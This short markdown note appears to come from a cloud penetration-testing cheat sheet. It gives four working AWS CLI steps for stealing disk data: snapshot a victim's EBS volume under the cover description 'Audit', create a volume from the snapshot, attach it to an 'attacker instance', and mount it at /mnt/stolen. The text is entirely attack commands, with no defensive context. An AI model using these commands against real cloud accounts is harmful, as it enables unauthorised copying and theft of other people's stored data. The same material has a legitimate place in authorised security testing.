# Mount EBS Volume

```bash
# Create snapshot of target volume
aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"

# Create volume from snapshot
aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a

# Attach to attacker instance
aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf

# Mount and access
sudo mkdir /mnt/stolen
sudo mount /dev/xvdf1 /mnt/stolen
```